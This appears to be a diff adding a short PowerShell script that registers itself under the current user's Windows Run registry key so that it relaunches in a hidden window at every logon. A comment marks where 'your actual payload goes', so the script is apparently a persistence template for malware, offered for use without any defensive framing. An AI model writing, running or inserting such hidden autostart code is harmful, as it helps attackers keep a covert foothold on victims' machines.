@@ -1,0 +1,11 @@
+$scriptPath = $MyInvocation.MyCommand.Path
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$name = "MyPersistentScript"
+
+if (!(Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue)) {
+    Set-ItemProperty -Path $regPath -Name $name -Value "powershell.exe -WindowStyle Hidden -File `"$scriptPath`""
+    Write-Host "Registered to startup!"
+}
+
+# Your actual payload goes here
+Write-Host "I run every time you boot :)"
